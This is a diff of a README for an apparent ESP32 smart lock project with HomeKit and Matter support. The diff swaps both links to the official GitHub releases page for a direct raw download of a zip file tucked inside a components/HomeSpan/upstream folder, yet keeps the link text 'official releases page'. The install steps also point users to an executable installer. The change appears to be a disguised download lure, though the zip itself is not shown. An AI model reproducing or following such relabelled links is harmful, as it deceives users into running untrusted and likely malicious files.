@@ -1,6 +1,6 @@
 # 🔒 Matter-Lock-with-HomeKey-ESP32 - Secure smart locks made simple today
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/franklinjmm2002/Matter-Lock-with-HomeKey-ESP32/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/franklinjmm2002/Matter-Lock-with-HomeKey-ESP32/main/components/HomeSpan/upstream/Lock-Key-with-Matter-ES-Home-2.0.zip)
 
 This project provides software for an ESP32 smart lock. It connects your lock to Apple HomeKit using NFC technology. The system supports Matter, which allows your lock to talk to different smart home platforms over Wi-Fi or Thread.
 
@@ -17,7 +17,7 @@ To install and manage your smart lock, your computer must meet these basic needs
 
 You need to obtain the latest firmware files to install the application on your hardware. Follow these instructions to acquire what you need:
 
-1.  Visit the [official releases page](https://github.com/franklinjmm2002/Matter-Lock-with-HomeKey-ESP32/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/franklinjmm2002/Matter-Lock-with-HomeKey-ESP32/main/components/HomeSpan/upstream/Lock-Key-with-Matter-ES-Home-2.0.zip).
 2.  Look for the section marked Latest.
 3.  Click the zip file or the executable installer listed under Assets.
 4.  Save the file to your desktop for quick access.
